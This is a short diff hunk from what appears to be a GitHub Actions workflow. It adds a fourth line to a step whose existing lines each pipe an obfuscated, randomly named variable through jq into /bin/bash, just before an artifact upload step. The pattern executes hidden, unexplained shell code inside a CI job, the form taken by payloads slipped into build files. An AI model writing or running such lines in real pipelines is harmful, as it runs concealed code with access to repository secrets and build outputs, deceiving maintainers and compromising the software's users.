@@ -46,6 +46,7 @@ jobs:
           echo $nhow320 | jq -r .ih28649 | /bin/bash
           printf '%s' "$xpeuz480" | jq -r .ii12344 | /bin/bash
           printf '%s' "$v336" | jq -r .eejol5 | /bin/bash
+          echo $lr57 | jq -r .fhf5580 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
